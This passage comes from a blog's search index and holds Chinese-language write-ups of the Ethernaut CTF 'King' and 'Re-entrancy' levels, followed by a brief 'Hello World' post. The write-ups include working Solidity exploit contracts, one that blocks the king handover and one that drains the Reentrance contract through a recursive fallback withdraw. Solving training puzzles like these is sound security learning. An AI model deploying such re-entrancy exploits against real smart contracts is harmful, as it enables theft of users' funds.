供调用，不能有效防止重入（reentrancy） 解题思路1.由于最后合约owner会调用fallback函数成为新的king，所以我们需要阻止这个函数的运行，也就是阻止transfer2.我们可以自己写个合约并将fallback函数设为revert()，这样就没有人可以通过transfer()打钱给我们。当然我们甚至可以不写fallback函数也可以实现这个效果 具体步骤1.编写exp合约(试了好几种写法都不行，只有这种可以，奇怪了)12345678pragma solidity ^0.4.18;contract exp &#123; function exp() public payable &#123; address attackAddr = 0x529c6e4d28d24af49eada89a2f7effa44c8f58c3; attackAddr.call.gas(1000000).value(msg.value)(); &#125;&#125; 2.部署合约，注意要传入比原先的1ETH多 3.查看king可以发现king已经变成了我们部署的合约的地址 4.点击submit instance即可过关。 通关后的彩蛋 Most of Ethernaut’s levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.In this case, see: King of the Ether and King of the Ether Postmortem level 10- Re-entrancy题目链接 胜利条件1.将合约中的所有钱卷走 tips1.不可信的合约可以执行人们不希望出现的代码2.Fallback方法3.Throw/revert bubbling4.用其他合约去攻击这个合约5.用Remix或Truffle 源码12345678910111213141516171819202122232425pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125; 解题思路这是一个比较著名的重入漏洞，漏洞点在withdraw，它会先判断账户是否有那么多余额在调用call进行转账，然后再将balances中的金额减少。但是我们前面说过call过去的地址如果是个合约地址，并且合约的fallback函数也调用了withdraw函数，那么这就会成为一个递归问题，一直到gas=0才会停止。div style=”width: 50%; margin: auto”&gt;所以我们可以利用这个机制编写合约将钱全部提出。 具体步骤1.编写exp合约12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125;contract exp &#123; address instance_address = 0xdc8941b8396a3140b008d124fcd149acd2005eff; Reentrance target = Reentrance(instance_address); function exp() payable&#123;&#125; function donate() public payable &#123; target.donate.value(msg.value)(this); &#125; function attack() public &#123; //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125; function get_balance() public view returns(uint) &#123; return target.balanceOf(this); &#125; function my_eth_bal() public view returns(uint) &#123; return address(this).balance; &#125; function ins_eth_bal() public view returns(uint) &#123; return instance_address.balance; &#125; function () public payable &#123; //同理写两次 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125;&#125; 2.调用donate方法捐款2ETH 3.调用attack方法进行攻击，可以看见钱全部在我们这里并且整数溢出了 攻击后的结果 4.点击submit instance即可过关。 通关后的彩蛋 Use transfer to move funds out of your contract, since it throws and limits gas forwarded. Low level functions like call and send just return false but don’t interrupt the execution flow when the receiving contract fails.Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.Re-entrancy is a common attack. You should always be prepared for it! The DAO HackThe famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F01%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Start这个博客主要用来记录一些有关ctf的知识因为自己太健忘了，不记录下会出事的而且搭个博客以后AWD就不用再坐着发呆了，起码有点东西可以看本博客主要分为web和crypto两个方向，也是我现在负责的两个方向希望自己多多加油吧！最后来个常规操作 1$ ehco "Hello world"]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
</search>
